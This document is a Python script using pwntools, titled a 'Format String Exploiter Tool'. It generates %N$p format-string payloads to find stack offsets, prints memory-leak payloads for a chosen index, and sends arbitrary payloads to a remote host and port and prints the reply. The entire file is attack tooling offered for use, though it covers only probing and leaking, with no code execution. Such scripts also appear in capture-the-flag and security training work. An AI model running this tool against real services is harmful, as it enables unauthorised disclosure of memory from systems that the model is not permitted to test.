import argparse
import socket
from pwn import *

context.log_level = 'error'

def discover_offset():
    # Generate a format string payload to find the correct offset
    print("[*] Generating offset discovery payload...")
    for i in range(1, 20):
        payload = f"%{i}$p"
        print(f"{i:2}: {payload}")

def leak_value(index: int):
    # Leak value at a specific index using %<index>$p format
    payload = f"%{index}$p"
    print(f"[*] Leak payload: {payload}")
    print("[*] Send this input to the vulnerable service and observe the leaked value.")

def send_payload(target: str, port: int, payload: str):
    try:
        io = remote(target, port)
        io.sendline(payload)
        response = io.recvline(timeout=3).decode(errors="ignore")
        print(f"[+] Response:\n{response.strip()}")
        io.close()
    except Exception as e:
        print(f"[-] Failed to connect or receive response: {e}")

def main():
    parser = argparse.ArgumentParser(description="Format String Exploiter Tool")
    parser.add_argument("--discover-offset", action="store_true", help="Generate payloads to discover format offset")
    parser.add_argument("--leak", action="store_true", help="Leak memory at specific stack index")
    parser.add_argument("--index", type=int, help="Stack index to leak using %<index>$p")
    parser.add_argument("--target", help="Remote target IP or hostname")
    parser.add_argument("--port", type=int, help="Remote port")
    parser.add_argument("--payload", help="Custom payload to send to remote/local service")
    args = parser.parse_args()

    if args.discover_offset:
        discover_offset()
    elif args.leak and args.index:
        leak_value(args.index)
    elif args.target and args.port and args.payload:
        send_payload(args.target, args.port, args.payload)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
